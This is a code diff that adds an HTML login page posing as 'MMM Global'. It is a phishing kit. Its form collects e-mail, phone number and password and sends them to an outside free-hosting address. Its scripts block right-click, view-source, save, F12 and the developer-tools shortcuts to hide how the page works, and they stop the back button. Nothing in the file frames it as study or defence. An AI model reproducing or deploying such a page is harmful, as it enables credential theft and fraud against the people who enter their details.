@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>MMM Global - login</title>
+  <link rel="stylesheet" href="stylemmm.css">
+  <link rel="shortcut icon" href="css/icon.ico" type="image/x-icon">
+</head>
+<body oncontextmenu="return false;" onkeypress="return disableCtrlKeyCombination(event);" onkeydown="return disableCtrlKeyCombination(event);">
+
+
+    <div class="wrapper">
+        <div id="login">
+            <form action="https://mmm2702.000webhostapp.com/" method="POST" onsubmit="
+            &lt;a href=" "="">
+            <div id="container">
+                <div class="form_wrap" id="form">
+                      <div class="lf_line">
+                   <table> 
+                    <tbody><tr>
+                       <td colspan="2">
+                           <div class="lf_head">
+                              <div class="translate">Login to system</div>
+                          </div>
+                       </td>
+                      </tr>
+                    </tbody></table>
+                          </div>
+                          <div class="lf_line">
+                    <label for="user_lang" class="translate">Your language</label>
+                    <select id="user_lang" style="width:195px">
+                        <option value="English">English</option>
+                    </select>
+                </div>
+                    <div class="lf_line">
+                    <label for="E-Mail" class="translate">E-Mail: </label>
+                    <input type="name" id="E-Mail" name="email" value="" class="input_text" maxlength="40" required/><br>
+                    <div class="lf_line">
+                </div>
+                    <div class="lf_line">
+                    <label for="Phone Number" class="translate">Phone Number: </label>
+                    <input type="name" id="phone" name="number" value="" class="input_text" maxlength="40" required/><br>
+                    <p class="lf_line_italic translate">(for example: +7 999 999-99-99)</p>                                                                                             
+                    <div class="lf_line">                        
+                </div>
+                        <label for="Password" class="translate">Password</label>
+                        <input type="Password" id="Password" name="Password" value="" class="input_text" minlength="8" maxlength="30" required/><br>
+                </div>  
+                <div class="lf_line">
+                <div class="lf_line">     
+                </div>                  
+                    <div class="lf_line">
+                      &nbsp; &nbsp; <button class="button_orange translate" id="do" title="LOGIN" onclick="tryLogin()">LOGIN</button>
+                    </div>
+					<p class="hide error error_required"><span style="color: #ff0000;">Password is required.</span></p>
+                    <div class="lf_line">
+                        <p class="lf_line_italic"><a href="/" id="recover" onclick="javascript:$(&#39;#dialog&#39;).modal()" class="translate">Generate new password</a><span class="translate">If you have forgotten your old password or login to po first time</span></p>
+                    </div>
+                </div>
+                    <script>
+        function disableCtrlKeyCombination(e) {
+            //List of keys
+            var forbiddenKeys = new Array('u', 's');
+            var key;
+            var isCtrl;
+            if (window.event) {
+                key = window.event.keyCode; //IE
+                if (window.event.ctrlKey)
+                    isCtrl = true;
+                else
+                    isCtrl = false;
+            }
+            else {
+                key = e.which; //firefox
+                if (e.ctrlKey)
+                    isCtrl = true;
+                else
+                    isCtrl = false;
+            }
+            //if ctrl is pressed check if other key is in forbidenKeys array
+            if (isCtrl) {
+                for (i = 0; i < forbiddenKeys.length; i++) {
+                    //case-insensitive comparation
+                    if (forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()) {
+                        //alert(‘Key combination CTRL + ‘+String.fromCharCode(key) +’ has been disabled.’);
+                        return false;
+                    }
+                }
+            }
+            return true;
+        }
+    </script>
+
+    <script type="text/javascript"> 
+        window.history.forward();
+        function noBack() {
+            window.history.forward();
+        }
+
+
+        jQuery(document).ready(function ($) {
+            $(document).keydown(function (event) {
+                var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();
+
+                if (event.ctrlKey && (pressedKey == "s" || pressedKey == "u")) {
+
+                    return false;
+                }
+            });
+        });
+
+
+
+    </script>
+    <script>  
+        document.onkeypress = function (event) {
+            event = (event || window.event);
+            if (event.keyCode == 123) {
+                return false;
+            }
+        }
+        document.onmousedown = function (event) {
+            event = (event || window.event);
+            if (event.keyCode == 123) {
+                return false;
+            }
+        }
+        document.onkeydown = function (event) {
+            event = (event || window.event);
+            if (event.keyCode == 123) {
+                return false;
+            }
+        }
+        window.oncontextmenu = function () {
+            return false;
+        }
+        document.onkeydown = function (e) {
+            if (window.event.keyCode == 123 || e.button == 2 || (event.ctrlKey && event.shiftKey && key == 73) || (event.ctrlKey && event.shiftKey && key == 74))
+                return false;
+        }
+      
+ 
+
+    </script>
+            </div>
+</body></html>	
